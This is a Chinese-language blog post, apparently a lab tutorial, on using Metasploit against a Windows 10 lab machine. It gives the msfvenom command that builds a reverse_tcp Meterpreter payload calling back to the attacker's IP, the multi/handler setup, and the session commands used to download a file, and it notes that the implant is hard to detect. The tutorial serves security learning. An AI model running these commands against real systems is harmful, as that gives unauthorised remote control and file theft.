---
title: Metasploit的简单应用
date: 2021-11-06 17:36:08
tags:
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-j33woy_1920x1080.png
---

#  Metasploit的简单应用

1、生成主控端、被控端。
2、获得靶机(Windows)控制权。
3、下载靶机上任意一个文件。

## 工具

靶机： 关闭了windows安全中心的win10，ip: 192.168.118.132

攻击机：kali ip:192.168.118.128

## 开搞

生成被控端

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.128 LPORT=5000 -f exe > /root/payload.exe
#LHOST=kali的ip
#LPORT=端口
```

![image-20211106175332973](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175332973.png)

![image-20211106175426563](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175426563.png)

将生成的payload.exe丢进靶机里面

![image-20211106180904411](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106180904411.png)

回到kali

运行msfconsole

![image-20211106181253626](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106181253626.png)

执行以下命令

```
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
```

![image-20211106185237839](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185237839.png)

执行 show options查看配置

![image-20211106185450806](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185450806.png)

发现LHOST和LPORT还没设置

执行

```
set lhost 192.168.118.128

set lport 5000
```

![image-20211106190234370](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190234370.png)

LHOST和LPORT已经重新设置

然后执行

```
exploit
```

等待对方上线

![image-20211106190753464](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190753464.png)

双击靶机的payload.exe就可以看到kali中出现了一个session，也就是会话，这表示从现在起，我们可以通过被控制端程序来控制目标计算机了。同时，我们可以看到上图中出现meterpreter，这就是一个被控程序，meterpreter是运行在内存中的，通过注入dll文件实现，在目标计算机的硬盘上不会留下文件痕迹，所以在被入侵时很难找到。输入ls就可以查看payload.exe文件所在的当前目录有哪些文件

![image-20211106191133783](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191133783.png)

我在靶机桌面上放了个flag.txt

![image-20211106192310207](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192310207.png)



回到kali执行ls查看文件

![image-20211106191512514](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191512514.png)

把它下载下来

```
download flag.txt
```

![image-20211106191953885](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191953885.png)

得到flag

![image-20211106192133806](https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192133806.png)





搞定收工
